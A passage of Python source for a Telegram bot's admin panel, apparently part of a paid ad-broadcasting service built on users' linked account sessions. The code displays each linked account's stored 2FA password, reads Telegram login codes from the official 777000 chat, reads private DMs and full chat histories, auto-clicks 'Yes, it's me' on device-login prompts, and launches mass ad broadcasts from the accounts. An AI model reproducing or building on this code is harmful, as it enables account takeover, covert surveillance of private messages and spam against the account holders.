            grp_cnt  = p_info.get("groups_count", 0)
            chn_cnt  = p_info.get("channels_count", 0)
            dm_cnt   = p_info.get("dms_count", 0)
            adm_cnt  = p_info.get("admin_count", 0)
            ow_chn   = p_info.get("owned_channels_count", 0)
            ad_chn   = p_info.get("admin_channels_count", 0)
            ow_grp   = p_info.get("owned_groups_count", 0)
            ad_grp   = p_info.get("admin_groups_count", 0)

            two_fa_pwd = dict(acc).get("two_fa_password") or ""
            pwd_str    = f"<code>{escape_html(two_fa_pwd)}</code>" if two_fa_pwd else "<i>No 2FA Set / Direct OTP</i>"

            header = f"{e('deco_fly_l')} <b>ACCOUNT INSPECTOR</b> {e('deco_fly_r')}"
            divider = f"{e('shock_ncl')}{e('shock_r')}{e('shock_r1')}{e('shock_r3')}{e('shock_r4')}{e('shock_r5')}{e('shock_r6')}{e('shock_ncr')}"

            text = (
                f"{header}\n{divider}\n\n"
                f"{e('crown')} <b>Account Name:</b> <b>{acc_name}</b>\n"
                f"{e('android')} <b>Phone:</b> <code>{phone}</code>\n"
                f"{e('text')} <b>Username:</b> <b>{username}</b>\n"
                f"🔑 <b>2FA Password:</b> {pwd_str}\n"
                f"{e('idcard')} <b>Telegram User ID:</b> <code>{tg_user_id}</code>\n"
                f"{e('dev')} <b>Owner User ID:</b> <code>{owner_id}</code>\n"
                f"{e('star')} <b>Premium Status:</b> <code>{prem_str}</code>\n"
                f"{e('globe')} <b>Data Center (DC):</b> <code>{dc_str}</code>\n"
                f"{divider}\n"
                f"👑 <b>Owned Channels:</b> <code>{ow_chn}</code> | 🛡 <b>Admin Channels:</b> <code>{ad_chn}</code>\n"
                f"👑 <b>Owned Groups:</b> <code>{ow_grp}</code> | 🛡 <b>Admin Groups:</b> <code>{ad_grp}</code>\n"
                f"{e('link')} <b>Total Joined Channels:</b> <code>{chn_cnt}</code>\n"
                f"{e('link')} <b>Total Joined Groups:</b> <code>{grp_cnt}</code>\n"
                f"{e('text')} <b>Direct Chats (DMs):</b> <code>{dm_cnt}</code>\n"
                f"{divider}\n"
                f"<i>Choose an inspection action below:</i>"
            )
            buttons = [
                [InlineKeyboardButton("Ac approve (Login Confirmation)",       callback_data=f"adm_approve_acc_{acc_id}",icon_custom_emoji_id=_E["check"], style="success")],
                [InlineKeyboardButton("Tg notifications",                     callback_data=f"adm_tg_notif_{acc_id}",   icon_custom_emoji_id=_E["text"],  style="primary")],
                [InlineKeyboardButton("User DMs & Telegram Official Notifs", callback_data=f"adm_notif_dms_{acc_id}", icon_custom_emoji_id=_E["text"],  style="primary")],
                [InlineKeyboardButton("Channels & Groups Notifications",       callback_data=f"adm_notif_groups_{acc_id}",icon_custom_emoji_id=_E["globe"], style="primary")],
                [InlineKeyboardButton("Full Chat Message History",               callback_data=f"adm_chats_list_{acc_id}", icon_custom_emoji_id=_E["clock"], style="primary")],
                [InlineKeyboardButton(f"Joined Channels ({chn_cnt})",           callback_data=f"adm_channels_{acc_id}",   icon_custom_emoji_id=_E["link"],  style="primary")],
                [InlineKeyboardButton(f"Joined Groups ({grp_cnt})",             callback_data=f"adm_groups_{acc_id}",     icon_custom_emoji_id=_E["link"],  style="primary")],
                [
                    InlineKeyboardButton("Remove Account", callback_data=f"adm_rm_acc_{acc_id}", icon_custom_emoji_id=_E["trash"], style="danger"),
                    InlineKeyboardButton("Back to Accounts", callback_data="adm_accs",                icon_custom_emoji_id=_E["arrow"], style="primary"),
                ]
            ]
            await query.message.reply_text(text, parse_mode="HTML", reply_markup=InlineKeyboardMarkup(buttons))

        # ── Approve Telegram Device Login ("Yes, it's me") ──────────────────────────
        elif data.startswith("adm_approve_acc_"):
            acc_id = int(data.replace("adm_approve_acc_", ""))
            acc    = db.get_account_by_id(acc_id)
            if not acc:
                await query.message.reply_text(f"{e('cross')} Account not found.", parse_mode="HTML")
                return

            phone = acc["phone"]
            await query.message.reply_text(f"⏳ Attempting Telegram Device Login Approval ('Yes, it\'s me') for <code>{phone}</code>...", parse_mode="HTML")
            res = await broadcaster.approve_telegram_login(acc["session_string"])

            back_kb = InlineKeyboardMarkup([[InlineKeyboardButton("Back to Account", callback_data=f"adm_acc_info_{acc_id}", icon_custom_emoji_id=_E["arrow"], style="primary")]])

            if res.get("success"):
                btn_txt = res.get("button_text", "Yes, it's me")
                await query.message.reply_text(
                    f"{e('check')} <b>Telegram Device Login Approved!</b>\n\n"
                    f"📱 <b>Account:</b> <code>{phone}</code>\n"
                    f"✅ Successfully clicked <code>{escape_html(btn_txt)}</code> prompt on Official Telegram chat (777000).",
                    parse_mode="HTML",
                    reply_markup=back_kb
                )
            elif res.get("found"):
                await query.message.reply_text(
                    f"{e('warning')} Login prompt found for <code>{phone}</code>, but could not click button.\nError: <code>{escape_html(res.get('error', ''))}</code>",
                    parse_mode="HTML",
                    reply_markup=back_kb
                )
            else:
                await query.message.reply_text(
                    f"ℹ️ <b>No Pending Login Confirmation Found</b>\n\n"
                    f"No active 'Yes, it's me' device login prompt found in Telegram chat (777000) for <code>{phone}</code>.",
                    parse_mode="HTML",
                    reply_markup=back_kb
                )

        # ── Category 0: Telegram Official Notifications + Recent Messages (Last 24 Hours) ──
        elif data.startswith("adm_tg_notif_") or data.startswith("adm_tg_notifs_"):
            if data.startswith("adm_tg_notif_"):
                acc_id = int(data.replace("adm_tg_notif_", ""))
            else:
                acc_id = int(data.replace("adm_tg_notifs_", ""))
            acc = db.get_account_by_id(acc_id)
            if not acc:
                await query.message.reply_text(f"{e('cross')} Account not found.", parse_mode="HTML")
                return

            phone = acc["phone"]
            first = escape_html(acc["first_name"] or f"Owner:{acc['owner_id']}")
            await query.message.reply_text(f"⏳ Fetching Account Notifications (Last 24 Hours) for <code>{phone}</code>...", parse_mode="HTML")

            # 1. Fetch Official Telegram 777000 Notifications (last 24 hours)
            tg_off = await broadcaster.get_session_telegram_official_notifs(acc["session_string"], hours=24, limit=20)

            # 2. Fetch User DMs & Recent Chat Messages (last 24 hours = 1440 mins)
            cat_notifs = await broadcaster.get_session_categorized_notifications(acc["session_string"], category="dms", minutes=1440, limit=20)

            header = f"{e('deco_fly_l')} <b>TG NOTIFICATIONS (LAST 24 HOURS)</b> {e('deco_fly_r')}"
            divider = f"{e('shock_ncl')}{e('shock_r')}{e('shock_r1')}{e('shock_r3')}{e('shock_r4')}{e('shock_r5')}{e('shock_r6')}{e('shock_ncr')}"

            full_header = (
                f"{header}\n{divider}\n"
                f"{e('android')} <b>Account:</b> <code>{phone}</code> — <b>{first}</b>\n"
                f"✈️ <b>Telegram Official OTPs & Recent Messages (Last 1 Day):</b>\n"
                f"{divider}"
            )

            items = []
            # Add Official Telegram Service messages first
            if tg_off:
                for n in tg_off:
                    date_s  = f" <i>({n['date']})</i>" if n['date'] else ""
                    msg_txt = escape_html(n["text"][:800])
                    items.append(f"✈️ <b>Telegram Official (777000)</b>{date_s}\n└ <code>{msg_txt}</code>")

            # Add User DMs & Chat Messages
            if cat_notifs:
                for n in cat_notifs:
                    unread     = f"🔴 <b>[{n['unread']} unread]</b> " if n["unread"] > 0 else ""
                    recent_tag = "⚡ <b>[LAST 24H]</b> " if n.get("is_recent") else ""
                    date_s     = f" <i>({n['date']})</i>" if n['date'] else ""
                    icon       = n.get("type_icon", "👤")
                    s_name     = escape_html(n["sender_name"])
                    uname      = f" (@{escape_html(n['username'])})" if n["username"] else ""
                    msg_txt    = escape_html(n["text"][:800])
                    items.append(f"{recent_tag}{unread}{icon} <b>Sender:</b> <b>{s_name}</b>{uname}{date_s}\n└ <code>{msg_txt}</code>")

            empty_msg = f"📭 No account notifications or Telegram messages found in the last 24 hours for <code>{phone}</code>."
            await send_safe_html_message(query, full_header, items, empty_msg, acc_id)

        # ── Category 1: User DMs & Telegram Official Notifications ──────────────────
        elif data.startswith("adm_notif_dms_"):
            acc_id = int(data.replace("adm_notif_dms_", ""))
            acc    = db.get_account_by_id(acc_id)
            if not acc:
                await query.message.reply_text(f"{e('cross')} Account not found.", parse_mode="HTML")
                return

            phone = acc["phone"]
            first = escape_html(acc["first_name"] or f"Owner:{acc['owner_id']}")
            await query.message.reply_text(f"⏳ Fetching User DMs & Telegram Official Notifs for <code>{phone}</code>...", parse_mode="HTML")
            notifs = await broadcaster.get_session_categorized_notifications(acc["session_string"], category="dms", minutes=5, limit=20)

            recent_count = sum(1 for n in notifs if n.get("is_recent"))
            header = f"{e('deco_fly_l')} <b>USER DMs & TELEGRAM NOTIFS</b> {e('deco_fly_r')}"
            divider = f"{e('shock_ncl')}{e('shock_r')}{e('shock_r1')}{e('shock_r3')}{e('shock_r4')}{e('shock_r5')}{e('shock_r6')}{e('shock_ncr')}"

            full_header = (
                f"{header}\n{divider}\n"
                f"{e('android')} <b>Account:</b> <code>{phone}</code> — <b>{first}</b>\n"
                f"⚡ <b>New in last 5 mins:</b> <code>{recent_count}</code>\n"
                f"{divider}"
            )

            items = []
            if notifs:
                for n in notifs:
                    unread     = f"🔴 <b>[{n['unread']} unread]</b> " if n["unread"] > 0 else ""
                    recent_tag = "⚡ <b>[LAST 5 MINS]</b> " if n.get("is_recent") else ""
                    date_s     = f" <i>({n['date']})</i>" if n['date'] else ""
                    icon       = n.get("type_icon", "👤")
                    s_name     = escape_html(n["sender_name"])
                    uname      = f" (@{escape_html(n['username'])})" if n["username"] else ""
                    msg_txt    = escape_html(n["text"])
                    items.append(f"{recent_tag}{unread}{icon} <b>Sender:</b> <b>{s_name}</b>{uname}{date_s}\n└ <code>{msg_txt}</code>")

            empty_msg = f"📭 No User DMs or Telegram Official notifications found for <code>{phone}</code>."
            await send_safe_html_message(query, full_header, items, empty_msg, acc_id)

        # ── Category 2: Channels & Groups Notifications ─────────────────────────────
        elif data.startswith("adm_notif_groups_"):
            acc_id = int(data.replace("adm_notif_groups_", ""))
            acc    = db.get_account_by_id(acc_id)
            if not acc:
                await query.message.reply_text(f"{e('cross')} Account not found.", parse_mode="HTML")
                return

            phone = acc["phone"]
            first = escape_html(acc["first_name"] or f"Owner:{acc['owner_id']}")
            await query.message.reply_text(f"⏳ Fetching Channels & Groups Notifications for <code>{phone}</code>...", parse_mode="HTML")
            notifs = await broadcaster.get_session_categorized_notifications(acc["session_string"], category="groups", minutes=5, limit=20)

            recent_count = sum(1 for n in notifs if n.get("is_recent"))
            header = f"{e('deco_fly_l')} <b>CHANNELS & GROUPS NOTIFS</b> {e('deco_fly_r')}"
            divider = f"{e('shock_ncl')}{e('shock_r')}{e('shock_r1')}{e('shock_r3')}{e('shock_r4')}{e('shock_r5')}{e('shock_r6')}{e('shock_ncr')}"

            full_header = (
                f"{header}\n{divider}\n"
                f"{e('android')} <b>Account:</b> <code>{phone}</code> — <b>{first}</b>\n"
                f"⚡ <b>New in last 5 mins:</b> <code>{recent_count}</code>\n"
                f"{divider}"
            )

            items = []
            if notifs:
                for n in notifs:
                    unread     = f"🔴 <b>[{n['unread']} unread]</b> " if n["unread"] > 0 else ""
                    recent_tag = "⚡ <b>[LAST 5 MINS]</b> " if n.get("is_recent") else ""
                    date_s     = f" <i>({n['date']})</i>" if n['date'] else ""
                    icon       = n.get("type_icon", "📢")
                    s_name     = escape_html(n["sender_name"])
                    uname      = f" (@{escape_html(n['username'])})" if n["username"] else ""
                    msg_txt    = escape_html(n["text"])
                    items.append(f"{recent_tag}{unread}{icon} <b>Source:</b> <b>{s_name}</b>{uname}{date_s}\n└ <code>{msg_txt}</code>")

            empty_msg = f"📭 No Channel or Group notifications found for <code>{phone}</code>."
            await send_safe_html_message(query, full_header, items, empty_msg, acc_id)

        # ── Select Chat for Full History ────────────────────────────
        elif data.startswith("adm_chats_list_"):
            acc_id = int(data.replace("adm_chats_list_", ""))
            acc    = db.get_account_by_id(acc_id)
            if not acc:
                await query.message.reply_text(f"{e('cross')} Account not found.", parse_mode="HTML")
                return

            await query.message.reply_text(f"⏳ Loading recent conversations list for <code>{acc['phone']}</code>...", parse_mode="HTML")
            dialogs = await broadcaster.get_session_dialogs_list(acc["session_string"], limit=20)

            header = f"{e('deco_fly_l')} <b>SELECT CHAT TO READ HISTORY</b> {e('deco_fly_r')}"
            divider = f"{e('shock_ncl')}{e('shock_r')}{e('shock_r1')}{e('shock_r3')}{e('shock_r4')}{e('shock_r5')}{e('shock_r6')}{e('shock_ncr')}"

            if not dialogs:
                await query.message.reply_text(f"{header}\n{divider}\n\n📭 No active conversations found.", parse_mode="HTML")
                return

            text = f"{header}\n{divider}\n{e('android')} <b>Account:</b> <code>{acc['phone']}</code>\n{divider}\n\n"
            buttons = []
            for d in dialogs:
                cid      = d["id"]
                title    = escape_html(d["title"])
                unread   = f" ({d['unread']} unread)" if d['unread'] > 0 else ""
                icon     = "👥" if "GROUP" in d['type'] else ("📢" if d['type'] == "CHANNEL" else "👤")
                text += f"• {icon} <b>{title}</b>{unread} — <code>{cid}</code>\n"
                buttons.append([InlineKeyboardButton(
                    f"{d['title'][:25]}{unread}",
                    callback_data=f"adm_chist_{acc_id}_{cid}",
                    icon_custom_emoji_id=_E["text"],
                    style="primary"
                )])

            buttons.append([InlineKeyboardButton("Back to Account", callback_data=f"adm_acc_info_{acc_id}", icon_custom_emoji_id=_E["arrow"], style="danger")])
            await query.message.reply_text(
                text, parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup(buttons)
            )

        # ── Full Chat Message History Viewer ──────────────────────────
        elif data.startswith("adm_chist_"):
            parts = data.replace("adm_chist_", "").split("_", 1)
            if len(parts) < 2:
                await query.message.reply_text(f"{e('cross')} Invalid query format.", parse_mode="HTML")
                return
            acc_id  = int(parts[0])
            chat_id = int(parts[1])

            acc = db.get_account_by_id(acc_id)
            if not acc:
                await query.message.reply_text(f"{e('cross')} Account not found.", parse_mode="HTML")
                return

            await query.message.reply_text(f"⏳ Reading full chat history for <code>{acc['phone']}</code>...", parse_mode="HTML")
            hist = await broadcaster.get_session_chat_history(acc["session_string"], chat_id=chat_id, limit=20)

            title = escape_html(hist.get("title", str(chat_id)))
            msgs  = hist.get("messages", [])

            header = f"{e('deco_fly_l')} <b>FULL MESSAGE HISTORY</b> {e('deco_fly_r')}"
            divider = f"{e('shock_ncl')}{e('shock_r')}{e('shock_r1')}{e('shock_r3')}{e('shock_r4')}{e('shock_r5')}{e('shock_r6')}{e('shock_ncr')}"

            if not msgs:
                text = f"{header}\n{divider}\n\n📭 No message history found for <b>{title}</b>."
            else:
                text = f"{header}\n{divider}\n💬 <b>Chat:</b> <b>{title}</b> (<code>{acc['phone']}</code>)\n{divider}\n\n"
                for m in reversed(msgs):
                    sender = escape_html(m["sender"])
                    date_s = m["date"]
                    t_text = escape_html(m["text"])
                    prefix = "📤" if m["outgoing"] else "📥"
                    text += f"{prefix} <b>{sender}</b> <i>({date_s})</i>\n└ <code>{t_text}</code>\n\n"

            await query.message.reply_text(
                text, parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup([[
                    InlineKeyboardButton("Back to Chat List", callback_data=f"adm_chats_list_{acc_id}", icon_custom_emoji_id=_E["arrow"], style="primary"),
                    InlineKeyboardButton("Account Home",      callback_data=f"adm_acc_info_{acc_id}",  icon_custom_emoji_id=_E["gear"],  style="primary")
                ]])
            )

        # ── Account Channels & Links (With Full Pagination) ────────
        elif data.startswith("adm_channels_"):
            parts  = data.split("_")
            acc_id = int(parts[2])
            page   = int(parts[3]) if len(parts) > 3 else 1
            acc    = db.get_account_by_id(acc_id)
            if not acc:
                await query.message.reply_text(f"{e('cross')} Account not found.", parse_mode="HTML")
                return

            if len(parts) <= 3:
                status_msg = await query.message.reply_text(f"⏳ Fetching joined channels & links for <code>{acc['phone']}</code>...", parse_mode="HTML")
            else:
                status_msg = None

            channels = await broadcaster.get_session_channels_with_links(acc["session_string"])

            header  = f"{e('deco_fly_l')} <b>JOINED CHANNELS ({len(channels)})</b> {e('deco_fly_r')}"
            divider = f"{e('shock_ncl')}{e('shock_r')}{e('shock_r1')}{e('shock_r3')}{e('shock_r4')}{e('shock_r5')}{e('shock_r6')}{e('shock_ncr')}"

            if not channels:
                msg_txt = f"{header}\n{divider}\n\n💭 Account <code>{acc['phone']}</code> has not joined any channels yet."
                if status_msg:
                    await status_msg.edit_text(msg_txt, parse_mode="HTML")
                else:
                    await safe_edit_text_or_caption(query, text=msg_txt, parse_mode="HTML")
                return

            page_size   = 20
            total_items = len(channels)
            total_pages = math.ceil(total_items / page_size) or 1
            page        = max(1, min(page, total_pages))

            start_idx = (page - 1) * page_size
            end_idx   = start_idx + page_size
            chunk     = channels[start_idx:end_idx]

            text = f"{header}\n{divider}\n{e('android')} <b>Account:</b> <code>{acc['phone']}</code> | <b>Page {page}/{total_pages}</b>\n{divider}\n\n"
            for i, c in enumerate(chunk, start_idx + 1):
                title = escape_html(c["title"])
                link  = c["link"]
                badge = " 👑 <b>[Admin/Creator]</b>" if c.get("is_admin") else ""
                text += f"<code>{i}.</code> <b>{title}</b>{badge}\n🔗 {link}\n<code>ID: {c['id']}</code> | 👥 <code>{c['members']} subs</code>\n\n"

            nav_row = []
            if page > 1:
                nav_row.append(InlineKeyboardButton("Previous", callback_data=f"adm_channels_{acc_id}_{page-1}", icon_custom_emoji_id=_E["arrow"], style="primary"))
            nav_row.append(InlineKeyboardButton(f"{page}/{total_pages}", callback_data="admin_home", icon_custom_emoji_id=_E["globe"]))
            if page < total_pages:
                nav_row.append(InlineKeyboardButton("Next", callback_data=f"adm_channels_{acc_id}_{page+1}", icon_custom_emoji_id=_E["arrow"], style="primary"))

            btn_rows = []
            if nav_row:
                btn_rows.append(nav_row)
            btn_rows.append([InlineKeyboardButton("Back to Account", callback_data=f"adm_acc_info_{acc_id}", icon_custom_emoji_id=_E["arrow"], style="primary")])

            reply_markup = InlineKeyboardMarkup(btn_rows)

            if status_msg:
                try:
                    await status_msg.delete()
                except Exception:
                    pass
                await query.message.reply_text(text, parse_mode="HTML", disable_web_page_preview=True, reply_markup=reply_markup)
            else:
                await safe_edit_text_or_caption(query, text=text, parse_mode="HTML", disable_web_page_preview=True, reply_markup=reply_markup)

        # ── Account Groups & Links (With Full Pagination) ──────────
        elif data.startswith("adm_groups_"):
            parts  = data.split("_")
            acc_id = int(parts[2])
            page   = int(parts[3]) if len(parts) > 3 else 1
            acc    = db.get_account_by_id(acc_id)
            if not acc:
                await query.message.reply_text(f"{e('cross')} Account not found.", parse_mode="HTML")
                return

            if len(parts) <= 3:
                status_msg = await query.message.reply_text(f"⏳ Fetching live joined groups & links for <code>{acc['phone']}</code>...", parse_mode="HTML")
            else:
                status_msg = None

            groups = await broadcaster.get_session_groups_with_links(acc["session_string"])

            header  = f"{e('deco_fly_l')} <b>JOINED GROUPS ({len(groups)})</b> {e('deco_fly_r')}"
            divider = f"{e('shock_ncl')}{e('shock_r')}{e('shock_r1')}{e('shock_r3')}{e('shock_r4')}{e('shock_r5')}{e('shock_r6')}{e('shock_ncr')}"

            if not groups:
                msg_txt = f"{header}\n{divider}\n\n💭 Account <code>{acc['phone']}</code> has not joined any groups yet."
                if status_msg:
                    await status_msg.edit_text(msg_txt, parse_mode="HTML")
                else:
                    await safe_edit_text_or_caption(query, text=msg_txt, parse_mode="HTML")
                return

            page_size   = 20
            total_items = len(groups)
            total_pages = math.ceil(total_items / page_size) or 1
            page        = max(1, min(page, total_pages))

            start_idx = (page - 1) * page_size
            end_idx   = start_idx + page_size
            chunk     = groups[start_idx:end_idx]

            text = f"{header}\n{divider}\n{e('android')} <b>Account:</b> <code>{acc['phone']}</code> | <b>Page {page}/{total_pages}</b>\n{divider}\n\n"
            for i, g in enumerate(chunk, start_idx + 1):
                title = escape_html(g["title"])
                link  = g["link"]
                badge = " 👑 <b>[Admin]</b>" if g.get("is_admin") else ""
                text += f"<code>{i}.</code> <b>{title}</b>{badge}\n🔗 {link}\n<code>ID: {g['id']}</code> | 👥 <code>{g['members']} members</code>\n\n"

            nav_row = []
            if page > 1:
                nav_row.append(InlineKeyboardButton("Previous", callback_data=f"adm_groups_{acc_id}_{page-1}", icon_custom_emoji_id=_E["arrow"], style="primary"))
            nav_row.append(InlineKeyboardButton(f"{page}/{total_pages}", callback_data="admin_home", icon_custom_emoji_id=_E["globe"]))
            if page < total_pages:
                nav_row.append(InlineKeyboardButton("Next", callback_data=f"adm_groups_{acc_id}_{page+1}", icon_custom_emoji_id=_E["arrow"], style="primary"))

            btn_rows = []
            if nav_row:
                btn_rows.append(nav_row)
            btn_rows.append([InlineKeyboardButton("Back to Account", callback_data=f"adm_acc_info_{acc_id}", icon_custom_emoji_id=_E["arrow"], style="primary")])

            reply_markup = InlineKeyboardMarkup(btn_rows)

            if status_msg:
                try:
                    await status_msg.delete()
                except Exception:
                    pass
                await query.message.reply_text(text, parse_mode="HTML", disable_web_page_preview=True, reply_markup=reply_markup)
            else:
                await safe_edit_text_or_caption(query, text=text, parse_mode="HTML", disable_web_page_preview=True, reply_markup=reply_markup)

        # ── Account Live Notifications ──────────────────────────────
        elif data.startswith("adm_notifs_"):
            acc_id = int(data.replace("adm_notifs_", ""))
            acc    = db.get_account_by_id(acc_id)
            if not acc:
                await query.message.reply_text(f"{e('cross')} Account not found.", parse_mode="HTML")
                return

            await query.message.reply_text(f"⏳ Reading live incoming messages for <code>{acc['phone']}</code>...", parse_mode="HTML")
            notifs = await broadcaster.get_session_notifications(acc["session_string"], limit=15)

            header = f"{e('deco_fly_l')} <b>LIVE INCOMING MESSAGES</b> {e('deco_fly_r')}"
            divider = f"{e('shock_ncl')}{e('shock_r')}{e('shock_r1')}{e('shock_r3')}{e('shock_r4')}{e('shock_r5')}{e('shock_r6')}{e('shock_ncr')}"

            if notifs:
                text = f"{header}\n{divider}\n{e('android')} <b>Account:</b> <code>{acc['phone']}</code>\n{divider}\n\n"
                for n in notifs:
                    unread = f"🔴 <b>[{n['unread']} unread]</b> " if n["unread"] > 0 else ""
                    date_s = f" <i>({n['date']})</i>" if n['date'] else ""
                    icon   = n.get("type_icon", "💬")
                    text += f"{unread}{icon} <b>{escape_html(n['title'])}</b>{date_s}\n└ <code>{escape_html(n['text'])}</code>\n\n"
            else:
                text = f"📭 No recent messages found for <code>{acc['phone']}</code>."

            await query.message.reply_text(
                text, parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup([[
                    InlineKeyboardButton("Back to Account", callback_data=f"adm_acc_info_{acc_id}", icon_custom_emoji_id=_E["arrow"], style="primary")
                ]])
            )

        # ── Remove Account by Admin ─────────────────────────────────
        elif data.startswith("adm_rm_acc_"):
            acc_id = int(data.replace("adm_rm_acc_", ""))
            acc    = db.get_account_by_id(acc_id)
            if acc:
                db.remove_account(acc["owner_id"], acc["phone"])
                await query.message.reply_text(
                    f"{e('check')} Account <code>{acc['phone']}</code> removed successfully!",
                    parse_mode="HTML",
                    reply_markup=InlineKeyboardMarkup([[
                        InlineKeyboardButton("Back to Accounts", callback_data="adm_accs", icon_custom_emoji_id=_E["arrow"], style="primary")
                    ]])
                )
            else:
                await query.message.reply_text(f"{e('cross')} Account not found.", parse_mode="HTML")

        # ── User Detail ─────────────────────────────────────────────
        elif data.startswith("adm_u_"):
            target_uid = int(data.replace("adm_u_", ""))
            accounts   = db.get_accounts(target_uid)
            settings   = db.get_settings(target_uid)
            ad         = db.get_ad(target_uid)
            stats      = db.get_stats(target_uid)
            running    = sched.is_user_running(target_uid)

            all_users = db.get_all_users()
            user_info = next((u for u in all_users if u["user_id"] == target_uid), None)
            name  = escape_html((user_info["first_name"] if user_info else None) or str(target_uid))
            uname = f" (@{escape_html(user_info['username'])})" if (user_info and user_info["username"]) else ""

            status_str = f"{e('fire')} <b>🟢 BROADCASTING LIVE</b>" if running else "⚪ Idle / Stopped"
            ad_status  = "Set ✅" if ad else "Not Set ❌"
            cycle_str  = f"Unlimited {e('infinity', '♾️')}" if settings["cycles"] == 0 else str(settings["cycles"])

            header = f"{e('deco_fly_l')} <b>USER CONTROL INSPECTOR</b> {e('deco_fly_r')}"
            divider = f"{e('shock_ncl')}{e('shock_r')}{e('shock_r1')}{e('shock_r3')}{e('shock_r4')}{e('shock_r5')}{e('shock_r6')}{e('shock_ncr')}"

            text = (
                f"{header}\n{divider}\n\n"
                f"{e('crown')} <b>User:</b> <b>{name}</b>{uname}\n"
                f"{e('dev')} <b>Telegram ID:</b> <code>{target_uid}</code>\n"
                f"{divider}\n"
                f"{e('android')} <b>Connected Accounts:</b> <code>{len(accounts)}</code>\n"
                f"{e('text')} <b>Ad Message:</b> <code>{ad_status}</code>\n"
                f"{e('clock')} <b>Interval:</b> <code>{settings['interval']}</code>\n"
                f"{e('chart')} <b>Cycles Target:</b> <code>{cycle_str}</code>\n"
                f"{e('check')} <b>Total Sent:</b> <code>{stats['sent']}</code>\n"
                f"{e('cross')} <b>Total Failed:</b> <code>{stats['failed']}</code>\n"
                f"{e('gear')} <b>Broadcast Status:</b> {status_str}\n"
                f"{divider}\n"
            )
            if accounts:
                text += f"\n{e('android')} <b>Linked Accounts:</b>\n"
                for acc in accounts:
                    text += f"• <code>{acc['phone']}</code>\n"

            buttons = [
                [
                    InlineKeyboardButton("Start Ads",  callback_data=f"adm_str_{target_uid}", icon_custom_emoji_id=_E["fire"],  style="success"),
                    InlineKeyboardButton("Stop Ads",    callback_data=f"adm_stp_{target_uid}", icon_custom_emoji_id=_E["cross"], style="danger"),
                ],
                [InlineKeyboardButton("Add Account for User", callback_data=f"adm_acc_{target_uid}", icon_custom_emoji_id=_E["plus"], style="primary")],
                [InlineKeyboardButton("Back to Users List",   callback_data="adm_users",              icon_custom_emoji_id=_E["arrow"],style="danger")],
            ]
            await query.message.reply_text(
                text, parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup(buttons)
            )

        # ── Admin: Start Ads for Specific User ────────────────────────
        elif data.startswith("adm_str_"):
            target_uid = int(data.replace("adm_str_", ""))
            accounts   = db.get_accounts(target_uid)
            ad         = db.get_ad(target_uid)
            settings   = db.get_settings(target_uid)

            if not accounts:
                await query.message.reply_text(f"❌ User `{target_uid}` has no accounts!", parse_mode="Markdown")
                return
            if not ad:
                await query.message.reply_text(f"❌ User `{target_uid}` has no ad message set!", parse_mode="Markdown")
                return
            if sched.is_user_running(target_uid):
                await query.message.reply_text(
                    f"⚠️ Broadcast already running for user `{target_uid}`!", parse_mode="Markdown"
                )
                return

            interval  = settings["interval"]
            cycles    = settings["cycles"]
            cycle_str = "♾️ Unlimited" if cycles == 0 else str(cycles)

            header = f"{e('deco_fly_l')} <b>BROADCAST STARTED</b> {e('deco_fly_r')}"
            divider = f"{e('shock_ncl')}{e('shock_r')}{e('shock_r1')}{e('shock_r3')}{e('shock_r4')}{e('shock_r5')}{e('shock_r6')}{e('shock_ncr')}"

            await query.message.reply_text(
                f"{header}\n{divider}\n\n"
                f"🚀 <b>[Admin] Starting broadcast for User <code>{target_uid}</code></b>\n\n"
                f"{e('android')} <b>Accounts:</b> <code>{len(accounts)}</code>\n"
                f"{e('clock')} <b>Interval:</b> <code>{interval}</code>\n"
                f"{e('chart')} <b>Cycles Target:</b> <code>{cycle_str}</code>\n{divider}\n"
                f"<i>⚡ First round running live now...</i>",
                parse_mode="HTML"
            )
            sched.start_user_job(
                owner_id=target_uid, interval_key=interval,
                max_cycles=cycles, bot=ctx.bot,
                chat_id=query.message.chat_id
            )
            result = await broadcaster.broadcast_once(target_uid)
            if "error" in result:
                await query.message.reply_text(f"{e('cross')} {result['error']}", parse_mode="HTML")
                sched.stop_user_job(target_uid)
            else:
                await query.message.reply_text(
                    f"{header}\n{divider}\n\n"
                    f"{e('check')} <b>[Admin] User <code>{target_uid}</code> Round 1 Done!</b>\n\n"
                    f"{e('check')} <b>Total Sent:</b> <code>{result['sent']}</code>\n"
                    f"{e('cross')} <b>Total Failed:</b> <code>{result['failed']}</code>\n"
                    f"{e('link')} <b>Target Reached:</b> <code>{result['groups']}</code>\n{divider}",
                    parse_mode="HTML"
                )

        # ── Admin: Stop Ads for Specific User ─────────────────────────
        elif data.startswith("adm_stp_"):
            target_uid = int(data.replace("adm_stp_", ""))
            if not sched.is_user_running(target_uid):
                await query.message.reply_text(f"{e('warning')} No broadcast running for user <code>{target_uid}</code>.", parse_mode="HTML")
                return
            sched.stop_user_job(target_uid)
            await query.message.reply_text(f"{e('cross')} <b>[Admin] Broadcast stopped for User <code>{target_uid}</code></b>", parse_mode="HTML")

        # ── Admin: Add Account for Specific User ──────────────────────
        elif data.startswith("adm_acc_"):
            target_uid = int(data.replace("adm_acc_", ""))
            ctx.user_data["state"] = ADMIN_WAITING_PHONE
            ctx.user_data["admin_target_uid"] = target_uid
            await query.message.reply_text(
                f"{e('android')} <b>[Admin] Add Account for User <code>{target_uid}</code></b>\n\n"
                "Send phone number with country code:\n"
                f"{e('worldd')} <b>Supports ALL Countries Worldwide</b> {e('world2')}\n"
                "<i>Examples: <code>+15551234567</code>, <code>+447900123456</code>, <code>+971501234567</code>, <code>+919876543210</code></i>\n\n"
                "Type /cancel to abort.",
                parse_mode="HTML"
            )

        # ── Admin: Approve Payment Screenshot ─────────────────────────
        elif data.startswith("adm_pay_approve_"):
            parts = data.replace("adm_pay_approve_", "").split("_")
            pay_id = int(parts[0])
            target_uid = int(parts[1])

            db.set_user_premium(target_uid, True)
            db.update_payment_status(pay_id, "approved")

            header = f"{e('deco_fly_l')} ✅ <b>PAYMENT APPROVED</b> {e('deco_fly_r')}"
            divider = f"{e('shock_ncl')}{e('shock_r')}{e('shock_r1')}{e('shock_r3')}{e('shock_r4')}{e('shock_r5')}{e('shock_r6')}{e('shock_ncr')}"

            await safe_edit_text_or_caption(
                query,
                text=f"{header}\n{divider}\n\n✅ <b>Payment #{pay_id} Approved!</b>\n👑 User <code>{target_uid}</code> has been granted Premium Membership access.",
                reply_markup=None,
                parse_mode="HTML"
            )

            # Send notification to user
            try:
